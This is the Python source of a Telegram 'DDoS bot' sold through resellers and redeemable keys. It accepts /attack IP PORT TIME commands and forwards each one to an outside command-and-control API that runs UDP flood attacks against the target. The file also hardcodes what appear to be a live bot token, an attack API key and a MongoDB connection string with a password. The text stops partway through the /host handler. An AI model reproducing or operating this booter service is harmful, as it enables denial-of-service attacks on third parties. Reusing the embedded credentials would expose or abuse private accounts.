#!/usr/bin/env python3
import telebot
import requests
import time
import threading
import json
import os
import random
import string
import re
from datetime import datetime, timedelta
from collections import defaultdict
from pymongo import MongoClient

# ========== CONFIG ==========
BOT_TOKEN = "8291785662:AAGwxYH9ufp0muPlLrF0wRMjtwIVQkkDe4k"
ADMIN_ID = ["8487946379"]
API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
API_KEY = "PFC10J"
MAX_CONCURRENT = 2
COOLDOWN_TIME = 30
BUY_CONTACT = "XSILENT"

# ========== MAINTENANCE MODE ==========
maintenance_mode = False
maintenance_message = "🔧 **Bot is under maintenance!** 🔧\n\nPlease try again later."

# ========== HOSTED BOTS ==========
hosted_bots = {}

# ========== MONGODB CONNECTION ==========
MONGO_URI = "mongodb+srv://mohitrao83076_db_user:LugF1xwlenkWRE1F@monster.ydmmckl.mongodb.net/?retryWrites=true&w=majority&appName=MONSTER"
client = MongoClient(MONGO_URI)
db = client["xsilent_bot"]
users_collection = db["users"]
keys_collection = db["keys"]
groups_collection = db["groups"]
hosted_bots_collection = db["hosted_bots"]
settings_collection = db["settings"]

# ========== DATA STRUCTURES ==========
active_attacks = {}
cooldown = {}
group_attack_times = {}

# ========== LOAD DATA FROM MONGODB ==========
def load_users():
    users_data = users_collection.find_one({"_id": "users"})
    if not users_data:
        users_collection.insert_one({"_id": "users", "users": [ADMIN_ID[0]], "resellers": []})
        return {"users": [ADMIN_ID[0]], "resellers": []}
    return users_data

def load_settings():
    settings = settings_collection.find_one({"_id": "settings"})
    if not settings:
        settings_collection.insert_one({"_id": "settings", "max_concurrent": 2, "cooldown": 30})
        return {"max_concurrent": 2, "cooldown": 30}
    return settings

def save_settings(settings):
    settings_collection.update_one({"_id": "settings"}, {"$set": settings}, upsert=True)

def load_keys():
    keys = {}
    for key_data in keys_collection.find():
        keys[key_data["key"]] = {
            "user_id": key_data.get("user_id"),
            "duration_value": key_data.get("duration_value"),
            "duration_unit": key_data.get("duration_unit"),
            "generated_by": key_data.get("generated_by"),
            "generated_at": key_data.get("generated_at"),
            "expires_at": key_data.get("expires_at"),
            "used": key_data.get("used", False),
            "used_by": key_data.get("used_by"),
            "used_at": key_data.get("used_at")
        }
    return keys

def save_users(data):
    users_collection.update_one({"_id": "users"}, {"$set": data}, upsert=True)

def save_keys(keys_data):
    keys_collection.delete_many({})
    for key, info in keys_data.items():
        keys_collection.insert_one({
            "key": key,
            "user_id": info.get("user_id"),
            "duration_value": info.get("duration_value"),
            "duration_unit": info.get("duration_unit"),
            "generated_by": info.get("generated_by"),
            "generated_at": info.get("generated_at"),
            "expires_at": info.get("expires_at"),
            "used": info.get("used", False),
            "used_by": info.get("used_by"),
            "used_at": info.get("used_at")
        })

def load_groups():
    groups = {}
    for group_data in groups_collection.find():
        groups[group_data["group_id"]] = {
            "attack_time": group_data.get("attack_time", 60),
            "added_by": group_data.get("added_by"),
            "added_at": group_data.get("added_at")
        }
    return groups

def save_group(group_id, attack_time, added_by):
    groups_collection.update_one(
        {"group_id": group_id},
        {"$set": {
            "attack_time": attack_time,
            "added_by": added_by,
            "added_at": time.time()
        }},
        upsert=True
    )

def remove_group(group_id):
    groups_collection.delete_one({"group_id": group_id})

def get_group_attack_time(group_id):
    group = groups_collection.find_one({"group_id": group_id})
    if group:
        return group.get("attack_time", 60)
    return None

def load_hosted_bots():
    bots = {}
    for bot_data in hosted_bots_collection.find():
        bots[bot_data["bot_token"]] = {
            "owner_id": bot_data.get("owner_id"),
            "owner_name": bot_data.get("owner_name"),
            "concurrent": bot_data.get("concurrent", 1),
            "active_attacks": {},
            "users": bot_data.get("users", []),
            "resellers": bot_data.get("resellers", [])
        }
    return bots

def save_hosted_bot(bot_token, owner_id, owner_name, concurrent):
    hosted_bots_collection.update_one(
        {"bot_token": bot_token},
        {"$set": {
            "owner_id": owner_id,
            "owner_name": owner_name,
            "concurrent": concurrent,
            "users": [],
            "resellers": []
        }},
        upsert=True
    )

def remove_hosted_bot(bot_token):
    hosted_bots_collection.delete_one({"bot_token": bot_token})

users_data = load_users()
users = users_data["users"]
resellers = users_data.get("resellers", [])
keys_data = load_keys()
groups = load_groups()
hosted_bots = load_hosted_bots()
settings = load_settings()
MAX_CONCURRENT = settings.get("max_concurrent", 2)
COOLDOWN_TIME = settings.get("cooldown", 30)

bot = telebot.TeleBot(BOT_TOKEN)

# ========== HELPER FUNCTIONS ==========
def check_maintenance():
    return maintenance_mode

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    
    if duration_str.isdigit():
        return int(duration_str), "day"
    
    if duration_str.endswith('h'):
        hours = duration_str.replace('h', '')
        if hours.isdigit():
            return int(hours), "hour"
    
    return None, None

def get_expiry_date(value, unit):
    if unit == "hour":
        return datetime.now() + timedelta(hours=value)
    else:
        return datetime.now() + timedelta(days=value)

def format_duration(value, unit):
    if unit == "hour":
        return f"`{value} Hour(s)`"
    else:
        return f"`{value} Day(s)`"

def check_total_active_attacks():
    now = time.time()
    count = 0
    for attack_id, info in list(active_attacks.items()):
        if now < info["finish_time"]:
            count += 1
        else:
            del active_attacks[attack_id]
    return count

def check_active_attack_by_target(ip, port):
    target_key = f"{ip}:{port}"
    now = time.time()
    for attack_id, attack_info in list(active_attacks.items()):
        if attack_info["target_key"] == target_key:
            if now < attack_info["finish_time"]:
                return attack_info
            else:
                del active_attacks[attack_id]
                return None
    return None

def format_attack_status():
    now = time.time()
    slots = []
    for attack_id, info in active_attacks.items():
        if now < info["finish_time"]:
            remaining = int(info["finish_time"] - now)
            slots.append({
                "target": info["target_key"],
                "user": info["user"],
                "remaining": remaining
            })
    
    slots_status = []
    for i in range(MAX_CONCURRENT):
        if i < len(slots):
            slots_status.append(f"❌ **SLOT {i+1}: BUSY**\n└ 🎯 `{slots[i]['target']}`\n└ 👤 `{slots[i]['user']}`\n└ ⏰ `{slots[i]['remaining']}s` left")
        else:
            slots_status.append(f"✅ **SLOT {i+1}: FREE**\n└ 💡 Ready for attack")
    
    return slots_status

def remove_user_from_system(user_id):
    if user_id in users:
        users.remove(user_id)
    if user_id in resellers:
        resellers.remove(user_id)
    users_data["users"] = users
    users_data["resellers"] = resellers
    save_users(users_data)
    
    for attack_id in list(active_attacks.keys()):
        if active_attacks[attack_id]["user"] == user_id:
            del active_attacks[attack_id]
    
    if user_id in cooldown:
        del cooldown[user_id]
    
    return True

def check_user_expiry(user_id):
    now = time.time()
    for key, info in keys_data.items():
        if info.get("used_by") == user_id and info.get("used") == True:
            if now < info["expires_at"]:
                return True
    return False

# ========== HOST BOT FUNCTION ==========
def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
    """Start a hosted bot instance"""
    try:
        hosted_bot = telebot.TeleBot(bot_token)
        
        @hosted_bot.message_handler(commands=['start'])
        def hosted_start(msg):
            hosted_bot.reply_to(msg, f"✨ **DDOS BOT** ✨\n\n👑 **Owner:** `{owner_name}`\n✅ **Status:** `Active`\n⚡ **Concurrent:** `{concurrent}`\n⏱️ **Max Time:** `300s`\n\n📝 **COMMANDS:**\n`/attack IP PORT TIME`\n`/status`\n`/addreseller USER_ID`\n`/removereseller USER_ID`\n`/genkey 1` or `5h`\n`/mykeys`\n`/redeem KEY`\n`/cooldown`\n`/help`\n\n🛒 **Buy:** @{owner_name}", parse_mode='Markdown')
        
        @hosted_bot.message_handler(commands=['cooldown'])
        def hosted_cooldown(msg):
            uid = str(msg.chat.id)
            if uid in hosted_cooldown_data:
                remaining = hosted_cooldown_data[uid] - time.time()
                if remaining > 0:
                    hosted_bot.reply_to(msg, f"⏳ **Cooldown:** `{int(remaining)}s` remaining!", parse_mode='Markdown')
                else:
                    del hosted_cooldown_data[uid]
                    hosted_bot.reply_to(msg, "✅ **No cooldown!** You can attack now.", parse_mode='Markdown')
            else:
                hosted_bot.reply_to(msg, "✅ **No cooldown!** You can attack now.", parse_mode='Markdown')
        
        @hosted_bot.message_handler(commands=['attack'])
        def hosted_attack(msg):
            uid = str(msg.chat.id)
            args = msg.text.split()
            if len(args) != 4:
                hosted_bot.reply_to(msg, "⚠️ **Usage:** `/attack IP PORT TIME`\n📌 **Example:** `/attack 1.1.1.1 443 60`", parse_mode='Markdown')
                return
            
            ip, port, duration = args[1], args[2], args[3]
            try:
                port = int(port)
                duration = int(duration)
                if duration < 10 or duration > 300:
                    hosted_bot.reply_to(msg, "❌ **Duration must be 10-300 seconds!**", parse_mode='Markdown')
                    return
            except:
                hosted_bot.reply_to(msg, "❌ **Invalid port or time!**", parse_mode='Markdown')
                return
            
            if bot_token not in hosted_bots:
                hosted_bots[bot_token] = {"active_attacks": {}}
            if "active_attacks" not in hosted_bots[bot_token]:
                hosted_bots[bot_token]["active_attacks"] = {}
            
            # Check total active attacks
            now = time.time()
            total_active = 0
            for a_id, a_info in hosted_bots[bot_token]["active_attacks"].items():
                if now < a_info["finish_time"]:
                    total_active += 1
            
            if total_active >= concurrent:
                hosted_bot.reply_to(msg, f"❌ **All attack slots are full!**\n📊 **Active:** `{total_active}/{concurrent}`\n💡 Use `/status` to check", parse_mode='Markdown')
                return
            
            # Check cooldown
            if uid in hosted_cooldown_data:
                remaining = hosted_cooldown_data[uid] - now
                if remaining > 0:
                    hosted_bot.reply_to(msg, f"⏳ **Wait `{int(remaining)}` seconds!**", parse_mode='Markdown')
                    return
            
            attack_id = f"{uid}_{int(time.time())}"
            target_key = f"{ip}:{port}"
            finish_time = now + duration
            
            # Check if target already under attack
            for a_id, a_info in hosted_bots[bot_token]["active_attacks"].items():
                if a_info["target_key"] == target_key and now < a_info["finish_time"]:
                    remaining = int(a_info["finish_time"] - now)
                    hosted_bot.reply_to(msg, f"❌ **TARGET UNDER ATTACK!**\n\n🎯 `{target_key}`\n👤 **By:** `{a_info['user']}`\n⏰ **Finishes in:** `{remaining}s`", parse_mode='Markdown')
                    return
            
            # Apply cooldown
            hosted_cooldown_data[uid] = now + COOLDOWN_TIME
            
            hosted_bots[bot_token]["active_attacks"][attack_id] = {
                "user": uid,
                "finish_time": finish_time,
                "ip": ip,
                "port": port,
                "target_key": target_key
            }
            
            new_total = 0
            for a_id, a_info in hosted_bots[bot_token]["active_attacks"].items():
                if now < a_info["finish_time"]:
                    new_total += 1
            
            hosted_bot.reply_to(msg, f"✨ **ATTACK LAUNCHED!** ✨\n\n🎯 **Target:** `{ip}:{port}`\n⏱️ **Duration:** `{duration}s`\n⚡ **Method:** `UDP (Auto)`\n📊 **Active Slots:** `{new_total}/{concurrent}`", parse_mode='Markdown')
            
            def run():
                try:
                    api_params = {
                        "api_key": API_KEY,
                        "target": ip,
                        "port": port,
                        "time": duration,
                        "concurrent": 1,
                        "method": "udp"
                    }
                    response = requests.get(API_URL, params=api_params, timeout=10)
                    if response.status_code == 200:
                        time.sleep(duration)
                        hosted_bot.send_message(msg.chat.id, f"✅ **ATTACK FINISHED!**\n\n🎯 **Target:** `{ip}:{port}`\n⏱️ **Duration:** `{duration}s`\n🔄 Restart your game!", parse_mode='Markdown')
                    else:
                        hosted_bot.send_message(msg.chat.id, "❌ **Attack failed!**", parse_mode='Markdown')
                except:
                    hosted_bot.send_message(msg.chat.id, "❌ **Attack error!**", parse_mode='Markdown')
                finally:
                    if attack_id in hosted_bots[bot_token]["active_attacks"]:
                        del hosted_bots[bot_token]["active_attacks"][attack_id]
            
            threading.Thread(target=run).start()
        
        @hosted_bot.message_handler(commands=['status'])
        def hosted_status(msg):
            now = time.time()
            active_list = []
            
            if bot_token in hosted_bots and "active_attacks" in hosted_bots[bot_token]:
                for attack_id, info in hosted_bots[bot_token]["active_attacks"].items():
                    if now < info["finish_time"]:
                        remaining = int(info["finish_time"] - now)
                        active_list.append(f"❌ **SLOT {len(active_list)+1}: BUSY**\n└ 🎯 `{info['target_key']}`\n└ 👤 `{info['user']}`\n└ ⏰ `{remaining}s` left")
            
            if active_list:
                status_msg = f"⚠️ **ACTIVE ATTACKS** (`{len(active_list)}/{concurrent}`) ⚠️\n\n" + "\n\n".join(active_list)
            else:
                status_msg = "✅ **ALL SLOTS FREE** ✅\n\n└ 💡 No ongoing attacks detected!\n└ 🚀 Use `/attack IP PORT TIME` to start"
            
            hosted_bot.reply_to(msg, status_msg, parse_mode='Markdown')
        
        @hosted_bot.message_handler(commands=['addreseller'])
        def hosted_add_reseller(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ **Only bot owner can add resellers!**", parse_mode='Markdown')
                return
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ **Usage:** `/addreseller USER_ID`", parse_mode='Markdown')
                return
            new_reseller = args[1]
            if bot_token not in hosted_bots:
                hosted_bots[bot_token] = {"resellers": []}
            if "resellers" not in hosted_bots[bot_token]:
                hosted_bots[bot_token]["resellers"] = []
            if new_reseller not in hosted_bots[bot_token]["resellers"]:
                hosted_bots[bot_token]["resellers"].append(new_reseller)
                hosted_bot.reply_to(msg, f"✅ **RESELLER ADDED!**\n\n👤 **User:** `{new_reseller}`\n🔑 Can now generate keys", parse_mode='Markdown')
            else:
                hosted_bot.reply_to(msg, "❌ **User is already a reseller!**", parse_mode='Markdown')
        
        @hosted_bot.message_handler(commands=['removereseller'])
        def hosted_remove_reseller(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ **Only bot owner can remove resellers!**", parse_mode='Markdown')
                return
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ **Usage:** `/removereseller USER_ID`", parse_mode='Markdown')
                return
            target = args[1]
            if bot_token in hosted_bots and "resellers" in hosted_bots[bot_token]:
                if target in hosted_bots[bot_token]["resellers"]:
                    hosted_bots[bot_token]["resellers"].remove(target)
                    hosted_bot.reply_to(msg, f"✅ **RESELLER REMOVED!**\n\n👤 **User:** `{target}`", parse_mode='Markdown')
                else:
                    hosted_bot.reply_to(msg, "❌ **User is not a reseller!**", parse_mode='Markdown')
            else:
                hosted_bot.reply_to(msg, "❌ **No resellers found!**", parse_mode='Markdown')
        
        @hosted_bot.message_handler(commands=['genkey'])
        def hosted_genkey(msg):
            uid = str(msg.chat.id)
            
            is_reseller = False
            if bot_token in hosted_bots and "resellers" in hosted_bots[bot_token]:
                if uid in hosted_bots[bot_token]["resellers"]:
                    is_reseller = True
            
            if uid != owner_id and not is_reseller:
                hosted_bot.reply_to(msg, "❌ **Owner or Reseller only!**", parse_mode='Markdown')
                return
            
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ **Usage:** `/genkey 1` (1 day) or `/genkey 5h` (5 hours)", parse_mode='Markdown')
                return
            
            duration_str = args[1]
            value, unit = parse_duration(duration_str)
            if value is None:
                hosted_bot.reply_to(msg, "❌ **Invalid duration!**\nUse: `1` (1 day) or `5h` (5 hours)", parse_mode='Markdown')
                return
            
            key = generate_key()
            expires_at = get_expiry_date(value, unit)
            
            keys_data[key] = {
                "user_id": "pending",
                "duration_value": value,
                "duration_unit": unit,
                "generated_by": uid,
                "generated_at": time.time(),
                "expires_at": expires_at.timestamp(),
                "used": False
            }
            save_keys(keys_data)
            
            expiry_str = expires_at.strftime('%Y-%m-%d %H:%M:%S')
            duration_display = format_duration(value, unit)
            
            hosted_bot.reply_to(msg, f"✅ **KEY GENERATED!**\n\n🔑 **Key:** `{key}`\n⏰ **Duration:** {duration_display}\n📅 **Expires:** `{expiry_str}`\n\n📌 Share this key with user!\n👤 **User:** `/redeem {key}`", parse_mode='Markdown')
        
        @hosted_bot.message_handler(commands=['mykeys'])
        def hosted_mykeys(msg):
            uid = str(msg.chat.id)
            
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ **Only bot owner can view keys!**", parse_mode='Markdown')
                return
            
            my_generated_keys = []
            for key, info in keys_data.items():
                if info.get("generated_by") == uid and not info.get("used", False):
                    expires = datetime.fromtimestamp(info["expires_at"]).strftime('%Y-%m-%d')
                    duration_display = format_duration(info['duration_value'], info['duration_unit'])
                    my_generated_keys.append(f"🔑 `{key}`\n   ⏰ {duration_display}\n   📅 Expires: `{expires}`")
            
            if my_generated_keys:
                hosted_bot.reply_to(msg, f"📋 **YOUR GENERATED KEYS:**\n\n" + "\n\n".join(my_generated_keys), parse_mode='Markdown')
            else:
                hosted_bot.reply_to(msg, "📋 **No keys generated yet!**", parse_mode='Markdown')
        
        @hosted_bot.message_handler(commands=['redeem'])
        def hosted_redeem(msg):
            uid = str(msg.chat.id)
            
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ **Usage:** `/redeem KEY`", parse_mode='Markdown')
                return
            
            key = args[1]
            
            if key not in keys_data:
                hosted_bot.reply_to(msg, "❌ **Invalid key!**", parse_mode='Markdown')
                return
            
            key_info = keys_data[key]
            
            if key_info.get("used", False):
                hosted_bot.reply_to(msg, "❌ **Key already used!**", parse_mode='Markdown')
                return
            
            if time.time() > key_info["expires_at"]:
                hosted_bot.reply_to(msg, "❌ **Key expired!**", parse_mode='Markdown')
                del keys_data[key]
                save_keys(keys_data)
                return
            
            if uid not in users:
                users.append(uid)
            
            users_data["users"] = users
            save_users(users_data)
            
            keys_data[key]["used"] = True
            keys_data[key]["used_at"] = time.time()
            keys_data[key]["used_by"] = uid
            save_keys(keys_data)
            
            expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%Y-%m-%d %H:%M:%S')
            duration_display = format_duration(key_info['duration_value'], key_info['duration_unit'])
            
            hosted_bot.reply_to(msg, f"✅ **ACCESS GRANTED!**\n\n🎉 User `{uid}` activated!\n⏰ **Duration:** {duration_display}\n📅 **Expires:** `{expiry_str}`\n⚡ **Concurrent:** `{concurrent}`", parse_mode='Markdown')
        
        @hosted_bot.message_handler(commands=['help'])
        def hosted_help(msg):
            hosted_bot.reply_to(msg, f"✨ **DDOS BOT HELP** ✨\n\n👑 **Owner:** `{owner_name}`\n\n📝 **COMMANDS:**\n\n`/attack IP PORT TIME` - Launch UDP attack\n`/status` - Check attack slots\n`/cooldown` - Check your cooldown\n`/addreseller USER_ID` - Add reseller (Owner only)\n`/removereseller USER_ID` - Remove reseller (Owner only)\n`/genkey 1 or 5h` - Generate key (Owner/Reseller)\n`/mykeys` - View your keys (Owner only)\n`/redeem KEY` - Activate key\n`/help` - This menu\n`/start` - Bot info\n\n⚡ **Concurrent Attacks:** `{concurrent}`\n⏱️ **Max Time:** `300s`\n⏳ **Cooldown:** `{COOLDOWN_TIME}s`\n🛒 **Buy:** @{owner_name}", parse_mode='Markdown')
        
        # Store cooldown data for hosted bot
        hosted_cooldown_data = {}
        
        # Start polling in a separate thread
        def run_hosted_bot():
            try:
                hosted_bot.infinity_polling()
            except:
                pass
        
        threading.Thread(target=run_hosted_bot, daemon=True).start()
        return True
    except Exception as e:
        print(f"Failed to start hosted bot: {e}")
        return False

# ========== MAIN BOT COMMANDS ==========
@bot.message_handler(commands=['start'])
def start(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if chat_type == "group" or chat_type == "supergroup":
        group_id = str(msg.chat.id)
        attack_time = get_group_attack_time(group_id)
        if attack_time:
            bot.reply_to(msg, f"✨ **XSILENT DDOS BOT - GROUP** ✨\n\n✅ **Group Approved!**\n⚡ **Attack Time:** `{attack_time}s`\n\n📝 **COMMANDS:**\n`/attack IP PORT`\n`/help`\n`/start`", parse_mode='Markdown')
        else:
            bot.reply_to(msg, f"❌ **Group not approved!**\n\n🛒 Contact: XSILENT", parse_mode='Markdown')
        return
    
    if uid in ADMIN_ID:
        bot.reply_to(msg, f"👑 **XSILENT DDOS BOT - OWNER** 👑\n\n✅ **Full Access**\n⚡ **Total Concurrent:** `{MAX_CONCURRENT}`\n⏳ **Cooldown:** `{COOLDOWN_TIME}s`\n⏱️ **Max Time:** `300s`\n\n📝 **COMMANDS:**\n`/attack IP PORT TIME`\n`/status`\n`/cooldown`\n`/setmax 1-100`\n`/setcooldown 1-300`\n`/genkey 1` or `/genkey 5h`\n`/removekey KEY`\n`/add USER`\n`/remove USER`\n`/addreseller USER`\n`/removereseller USER`\n`/addgroup GROUP_ID TIME`\n`/removegroup GROUP_ID`\n`/host BOT_TOKEN USER_ID CONCURRENT NAME`\n`/unhost BOT_TOKEN`\n`/maintenance on/off`\n`/broadcast` (with photo/video)\n`/stopattack IP:PORT`\n`/allusers`\n`/allgroups`\n`/allhosts`\n`/api_status`\n\n🛒 **Buy:** XSILENT", parse_mode='Markdown')
    elif uid in resellers:
        bot.reply_to(msg, f"💎 **XSILENT DDOS BOT - RESELLER** 💎\n\n✅ **Reseller Access**\n⚡ **Total Concurrent:** `{MAX_CONCURRENT}`\n⏳ **Cooldown:** `{COOLDOWN_TIME}s`\n\n📝 **COMMANDS:**\n`/attack IP PORT TIME`\n`/status`\n`/cooldown`\n`/genkey 1` or `/genkey 5h`\n`/mykeys`\n\n🛒 **Buy:** XSILENT", parse_mode='Markdown')
    elif uid in users:
        has_active = check_user_expiry(uid)
        bot.reply_to(msg, f"🔥 **XSILENT DDOS BOT - USER** 🔥\n\n✅ **Status:** `{'Active' if has_active else 'Expired'}`\n⚡ **Total Concurrent:** `{MAX_CONCURRENT}`\n⏳ **Cooldown:** `{COOLDOWN_TIME}s`\n\n📝 **COMMANDS:**\n`/attack IP PORT TIME`\n`/status`\n`/cooldown`\n`/redeem KEY`\n\n🛒 **Buy:** XSILENT", parse_mode='Markdown')
    else:
        bot.reply_to(msg, f"❌ **Unauthorized!**\n\nUse `/redeem KEY` to activate\n\n🛒 **Buy access:** XSILENT", parse_mode='Markdown')

@bot.message_handler(commands=['cooldown'])
def cooldown_cmd(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ **Unauthorized!**", parse_mode='Markdown')
        return
    
    if uid in cooldown:
        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if remaining > 0:
            bot.reply_to(msg, f"⏳ **Your cooldown:** `{int(remaining)}s` remaining!", parse_mode='Markdown')
        else:
            del cooldown[uid]
            bot.reply_to(msg, "✅ **No cooldown!** You can attack now.", parse_mode='Markdown')
    else:
        bot.reply_to(msg, "✅ **No cooldown!** You can attack now.", parse_mode='Markdown')

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ **Usage:** `/setcooldown 1-300`\n📌 **Example:** `/setcooldown 60`", parse_mode='Markdown')
        return
    
    try:
        new_cooldown = int(args[1])
        if new_cooldown < 1 or new_cooldown > 300:
            bot.reply_to(msg, "❌ **Value must be between 1 and 300 seconds!**", parse_mode='Markdown')
            return
    except:
        bot.reply_to(msg, "❌ **Invalid number!**", parse_mode='Markdown')
        return
    
    global COOLDOWN_TIME
    COOLDOWN_TIME = new_cooldown
    settings["cooldown"] = new_cooldown
    save_settings(settings)
    
    bot.reply_to(msg, f"✅ **COOLDOWN UPDATED!**\n\n⏳ **New Cooldown:** `{COOLDOWN_TIME}s`\n💡 Applies to all users and hosted bots", parse_mode='Markdown')

@bot.message_handler(commands=['setmax'])
def set_max_concurrent(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ **Usage:** `/setmax 1-100`\n📌 **Example:** `/setmax 5`", parse_mode='Markdown')
        return
    
    try:
        new_max = int(args[1])
        if new_max < 1 or new_max > 100:
            bot.reply_to(msg, "❌ **Value must be between 1 and 100!**", parse_mode='Markdown')
            return
    except:
        bot.reply_to(msg, "❌ **Invalid number!**", parse_mode='Markdown')
        return
    
    global MAX_CONCURRENT
    MAX_CONCURRENT = new_max
    settings["max_concurrent"] = new_max
    save_settings(settings)
    
    bot.reply_to(msg, f"✅ **MAX CONCURRENT UPDATED!**\n\n⚡ **New Value:** `{MAX_CONCURRENT}`\n💡 Use `/status` to see changes", parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    is_group = (chat_type == "group" or chat_type == "supergroup")
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if is_group:
        group_id = str(msg.chat.id)
        attack_time_limit = get_group_attack_time(group_id)
        if not attack_time_limit:
            bot.reply_to(msg, f"❌ **Group not approved!**\n\n🛒 Contact: XSILENT", parse_mode='Markdown')
            return
    else:
        attack_time_limit = 300
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers and not is_group:
        bot.reply_to(msg, f"❌ **Unauthorized!**\n\n🛒 Buy: XSILENT", parse_mode='Markdown')
        return
    
    if not is_group and uid not in ADMIN_ID and not check_user_expiry(uid):
        bot.reply_to(msg, f"❌ **Your access has expired!**\n\n🛒 Buy new key: XSILENT", parse_mode='Markdown')
        return
    
    total_active = check_total_active_attacks()
    if total_active >= MAX_CONCURRENT:
        bot.reply_to(msg, f"❌ **All attack slots are full!**\n📊 **Total active:** `{total_active}/{MAX_CONCURRENT}`\n💡 Use `/status` to check", parse_mode='Markdown')
        return
    
    # Check cooldown
    if uid in cooldown and not is_group:
        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if remaining > 0:
            bot.reply_to(msg, f"⏳ **Wait `{int(remaining)}` seconds!**\n💡 Use `/cooldown` to check", parse_mode='Markdown')
            return
    
    args = msg.text.split()
    if is_group:
        if len(args) != 3:
            bot.reply_to(msg, "⚠️ **Usage:** `/attack IP PORT`\n📌 **Example:** `/attack 1.1.1.1 443`", parse_mode='Markdown')
            return
        ip, port = args[1], args[2]
        duration = attack_time_limit
    else:
        if len(args) != 4:
            bot.reply_to(msg, "⚠️ **Usage:** `/attack IP PORT TIME`\n📌 **Example:** `/attack 1.1.1.1 443 60`", parse_mode='Markdown')
            return
        ip, port, duration = args[1], args[2], args[3]
        try:
            duration = int(duration)
        except:
            bot.reply_to(msg, "❌ **Invalid time!**", parse_mode='Markdown')
            return
    
    try:
        port = int(port)
        if duration < 10 or duration > attack_time_limit:
            bot.reply_to(msg, f"❌ **Duration must be 10-{attack_time_limit} seconds!**", parse_mode='Markdown')
            return
    except:
        bot.reply_to(msg, "❌ **Invalid port!**", parse_mode='Markdown')
        return
    
    existing_attack = check_active_attack_by_target(ip, port)
    if existing_attack:
        remaining = int(existing_attack["finish_time"] - time.time())
        bot.reply_to(msg, f"❌ **TARGET UNDER ATTACK!**\n\n🎯 `{ip}:{port}`\n👤 **By:** `{existing_attack['user']}`\n⏰ **Finishes in:** `{remaining}s`", parse_mode='Markdown')
        return
    
    if not is_group:
        cooldown[uid] = time.time()
    
    attack_id = f"{uid}_{int(time.time())}"
    target_key = f"{ip}:{port}"
    finish_time = time.time() + duration
    
    active_attacks[attack_id] = {
        "user": uid,
        "finish_time": finish_time,
        "ip": ip,
        "port": port,
        "target_key": target_key,
        "start_time": time.time()
    }
    
    new_total = check_total_active_attacks()
    bot.reply_to(msg, f"✨ **ATTACK LAUNCHED!** ✨\n\n🎯 **Target:** `{ip}:{port}`\n⏱️ **Duration:** `{duration}s`\n⚡ **Method:** `UDP (Auto)`\n📊 **Total active slots:** `{new_total}/{MAX_CONCURRENT}`", parse_mode='Markdown')
    
    def run():
        retry = 0
        while retry < 3:
            try:
                api_params = {
                    "api_key": API_KEY,
                    "target": ip,
                    "port": port,
                    "time": duration,
                    "concurrent": 1,
                    "method": "udp"
                }
                
                response = requests.get(API_URL, params=api_params, timeout=10)
                
                if response.status_code == 200:
                    time.sleep(duration)
                    bot.send_message(msg.chat.id, f"✅ **ATTACK FINISHED!**\n\n🎯 **Target:** `{ip}:{port}`\n⏱️ **Duration:** `{duration}s`\n🔄 Restart your game!", parse_mode='Markdown')
                    break
                else:
                    retry += 1
                    if retry < 3:
                        time.sleep(2)
                        continue
                    bot.send_message(msg.chat.id, f"❌ **Attack failed!**\n\n🛒 Contact: XSILENT", parse_mode='Markdown')
                    
            except Exception as e:
                retry += 1
                if retry < 3:
                    time.sleep(2)
                    continue
                bot.send_message(msg.chat.id, f"❌ **Attack failed! API offline.**\n\n🛒 Contact: XSILENT", parse_mode='Markdown')
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    
    threading.Thread(target=run).start()

@bot.message_handler(commands=['status'])
def status(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    slots_status = format_attack_status()
    total_active = check_total_active_attacks()
    status_msg = "📊 **SLOT STATUS**\n\n"
    status_msg += "\n\n".join(slots_status)
    status_msg += f"\n\n📊 **TOTAL ACTIVE:** `{total_active}/{MAX_CONCURRENT}`"
    
    if uid in cooldown:
        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if remaining > 0:
            status_msg += f"\n⏳ **YOUR COOLDOWN:** `{int(remaining)}s`"
    
    status_msg += f"\n\n🛒 **Buy:** XSILENT"
    bot.reply_to(msg, status_msg, parse_mode='Markdown')

@bot.message_handler(commands=['host'])
def host_bot(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
